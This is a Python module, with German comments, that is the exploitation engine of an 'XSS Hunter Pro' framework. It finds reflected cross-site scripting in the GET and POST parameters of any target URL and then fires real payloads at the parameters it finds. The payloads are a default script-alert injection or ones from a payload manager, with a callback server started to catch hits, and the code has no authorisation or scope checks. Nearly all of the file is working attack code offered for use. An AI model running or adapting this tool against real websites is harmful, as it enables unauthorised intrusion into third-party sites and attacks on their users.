#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - Exploitation Engine
=============================================

Dieses Modul implementiert die Exploitation-Engine für das XSS Hunter Framework.

Autor: Anonymous
Lizenz: MIT
Version: 0.2.0
"""

import os
import sys
import json
import random
import logging
import urllib.parse
import requests
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Konfiguration für Logging
logger = logging.getLogger("XSSHunterPro.ExploitationEngine")


class ExploitationEngine:
    """
    Engine für die Exploitation von XSS-Schwachstellen.
    """

    def __init__(self, config=None):
        """
        Initialisiert die Exploitation-Engine.

        Args:
            config: Die Konfiguration für die Exploitation-Engine (optional).
        """
        self.config = config or {}
        self.payload_manager = None
        self.callback_server = None
        
        # Initialisiere den Callback-Server, wenn konfiguriert
        callback_config = self.config.get("callback_server", {})
        
        if callback_config.get("auto_start", False):
            self._init_callback_server(callback_config)
    
    def set_payload_manager(self, payload_manager):
        """
        Setzt den Payload-Manager.

        Args:
            payload_manager: Der Payload-Manager.
        """
        self.payload_manager = payload_manager
    
    def _init_callback_server(self, config: Dict[str, Any]):
        """
        Initialisiert den Callback-Server.

        Args:
            config: Die Konfiguration für den Callback-Server.
        """
        try:
            # Importiere den Callback-Server
            from modules.callback_server import CallbackServer
            
            # Erstelle den Callback-Server
            self.callback_server = CallbackServer(config)
            
            # Starte den Server
            self.callback_server.start()
            
            logger.info("Callback-Server erfolgreich gestartet")
        except Exception as e:
            logger.error(f"Fehler beim Initialisieren des Callback-Servers: {e}")
    
    def _exploit_get(self, url: str, param: str, payload: str) -> Dict[str, Any]:
        """
        Führt eine GET-Exploitation durch.

        Args:
            url: Die Ziel-URL.
            param: Der zu exploitierende Parameter.
            payload: Der Payload.

        Returns:
            Das Ergebnis der Exploitation.
        """
        try:
            # Erstelle die Exploit-URL
            parsed_url = urllib.parse.urlparse(url)
            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            query_params[param] = payload
            
            # Erstelle die neue Query
            new_query = urllib.parse.urlencode(query_params)
            
            # Erstelle die neue URL
            exploit_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Sende die Anfrage
            response = requests.get(exploit_url, timeout=10)
            
            # Überprüfe, ob der Payload in der Antwort enthalten ist
            payload_in_response = payload in response.text
            
            return {
                "success": True,
                "url": exploit_url,
                "param": param,
                "payload": payload,
                "response_code": response.status_code,
                "payload_in_response": payload_in_response,
                "response_text": response.text[:1000]  # Begrenzen, um Speicherplatz zu sparen
            }
        except Exception as e:
            logger.error(f"Fehler bei der GET-Exploitation: {e}")
            return {
                "success": False,
                "url": url,
                "param": param,
                "payload": payload,
                "error": str(e)
            }
    
    def _exploit_post(self, url: str, param: str, payload: str, data: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Führt eine POST-Exploitation durch.

        Args:
            url: Die Ziel-URL.
            param: Der zu exploitierende Parameter.
            payload: Der Payload.
            data: Zusätzliche POST-Daten (optional).

        Returns:
            Das Ergebnis der Exploitation.
        """
        try:
            # Erstelle die POST-Daten
            post_data = data.copy() if data else {}
            post_data[param] = payload
            
            # Sende die Anfrage
            response = requests.post(url, data=post_data, timeout=10)
            
            # Überprüfe, ob der Payload in der Antwort enthalten ist
            payload_in_response = payload in response.text
            
            return {
                "success": True,
                "url": url,
                "param": param,
                "payload": payload,
                "response_code": response.status_code,
                "payload_in_response": payload_in_response,
                "response_text": response.text[:1000]  # Begrenzen, um Speicherplatz zu sparen
            }
        except Exception as e:
            logger.error(f"Fehler bei der POST-Exploitation: {e}")
            return {
                "success": False,
                "url": url,
                "param": param,
                "payload": payload,
                "error": str(e)
            }
    
    def exploit(self, url: str, param: str, method: str = "GET", data: Dict[str, Any] = None, context: str = "html", exploit_type: str = None) -> Dict[str, Any]:
        """
        Führt eine Exploitation durch.

        Args:
            url: Die Ziel-URL.
            param: Der zu exploitierende Parameter.
            method: Die HTTP-Methode (GET oder POST).
            data: Zusätzliche POST-Daten (optional).
            context: Der Kontext (html, javascript, url, dom).
            exploit_type: Der Exploit-Typ (optional).

        Returns:
            Das Ergebnis der Exploitation.
        """
        # Generiere einen Payload, wenn ein Payload-Manager verfügbar ist
        if self.payload_manager:
            payload_result = self.payload_manager.generate_payload(context, exploit_type)
            
            if not payload_result["success"]:
                return payload_result
            
            payload = payload_result["payload"]
        else:
            # Verwende einen Standard-Payload
            payload = "<script>alert('XSS')</script>"
        
        # Führe die Exploitation durch
        if method.upper() == "GET":
            return self._exploit_get(url, param, payload)
        elif method.upper() == "POST":
            return self._exploit_post(url, param, payload, data)
        else:
            return {
                "success": False,
                "url": url,
                "param": param,
                "payload": payload,
                "error": f"Ungültige HTTP-Methode: {method}"
            }
    
    def scan(self, url: str, params: List[str] = None, method: str = "GET", data: Dict[str, Any] = None, context: str = "html") -> Dict[str, Any]:
        """
        Scannt eine URL auf XSS-Schwachstellen.

        Args:
            url: Die zu scannende URL.
            params: Die zu testenden Parameter (optional).
            method: Die HTTP-Methode (GET oder POST).
            data: Zusätzliche POST-Daten (optional).
            context: Der Kontext (html, javascript, url, dom).

        Returns:
            Das Ergebnis des Scans.
        """
        # Wenn keine Parameter angegeben sind, extrahiere sie aus der URL
        if not params:
            parsed_url = urllib.parse.urlparse(url)
            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
            params = list(query_params.keys())
        
        # Wenn keine Parameter gefunden wurden, gib einen Fehler zurück
        if not params:
            return {
                "success": False,
                "url": url,
                "error": "Keine Parameter gefunden"
            }
        
        # Scanne jeden Parameter
        results = []
        
        for param in params:
            # Generiere einen Test-Payload
            test_payload = f"XSS_TEST_{random.randint(1000, 9999)}"
            
            # Führe die Exploitation durch
            if method.upper() == "GET":
                result = self._exploit_get(url, param, test_payload)
            elif method.upper() == "POST":
                result = self._exploit_post(url, param, test_payload, data)
            else:
                result = {
                    "success": False,
                    "url": url,
                    "param": param,
                    "error": f"Ungültige HTTP-Methode: {method}"
                }
            
            # Überprüfe, ob der Parameter anfällig ist
            if result["success"] and result.get("payload_in_response", False):
                # Führe eine echte Exploitation durch
                exploit_result = self.exploit(url, param, method, data, context)
                results.append(exploit_result)
        
        return {
            "success": True,
            "url": url,
            "params": params,
            "method": method,
            "context": context,
            "results": results,
            "vulnerable_params": [r["param"] for r in results if r["success"] and r.get("payload_in_response", False)]
        }
    
    def cleanup(self):
        """
        Bereinigt Ressourcen.
        """
        # Stoppe den Callback-Server, wenn er läuft
        if self.callback_server:
            try:
                self.callback_server.stop()
                logger.info("Callback-Server erfolgreich gestoppt")
            except Exception as e:
                logger.error(f"Fehler beim Stoppen des Callback-Servers: {e}")


# Beispiel für die Verwendung
if __name__ == "__main__":
    # Konfiguriere Logging
    logging.basicConfig(level=logging.INFO)
    
    # Erstelle die Exploitation-Engine
    engine = ExploitationEngine()
    
    # Erstelle einen Payload-Manager
    from modules.payload_manager import PayloadManager
    payload_manager = PayloadManager()
    
    # Setze den Payload-Manager
    engine.set_payload_manager(payload_manager)
    
    # Führe eine Exploitation durch
    result = engine.exploit("https://example.com/search", "q", "GET", None, "html", "reflected_xss")
    
    # Gib das Ergebnis aus
    print(f"Erfolg: {result['success']}")
    print(f"URL: {result.get('url', 'N/A')}")
    print(f"Parameter: {result.get('param', 'N/A')}")
    print(f"Payload: {result.get('payload', 'N/A')}")
    print(f"Payload in Antwort: {result.get('payload_in_response', False)}")
    
    # Bereinige Ressourcen
    engine.cleanup()
